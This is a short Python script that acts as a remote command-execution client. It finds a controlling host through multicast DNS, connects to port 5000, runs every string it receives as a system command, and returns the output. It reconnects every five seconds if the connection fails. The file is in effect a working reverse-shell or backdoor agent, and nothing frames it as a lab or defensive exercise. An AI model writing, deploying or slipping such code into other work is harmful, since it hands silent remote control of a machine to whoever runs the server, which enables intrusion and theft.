import socket
from multicast_dns import *
import time
import subprocess

def cmd(c):
    return subprocess.Popen(c.split(" "), stdout=subprocess.PIPE).communicate(timeout=10)

def client_program():
    ip = listen_dns()

    port = 5000  # socket server port number

    while True:
        print("Connecting to", ip)
        try:
            client_socket = socket.socket()  # instantiate
            client_socket.connect((ip, port))  # connect to the server

            while True:
                data = client_socket.recv(1024).decode()
                if data == "stop" or data == "":
                    break
                try:
                    ret = cmd(data)[0]
                except Exception as e:
                    ret = bytes(str(e), "utf-8")
                client_socket.send(ret)

            client_socket.close()  # close the connection
        except:
            time.sleep(5)
            pass


if __name__ == '__main__':
    client_program()
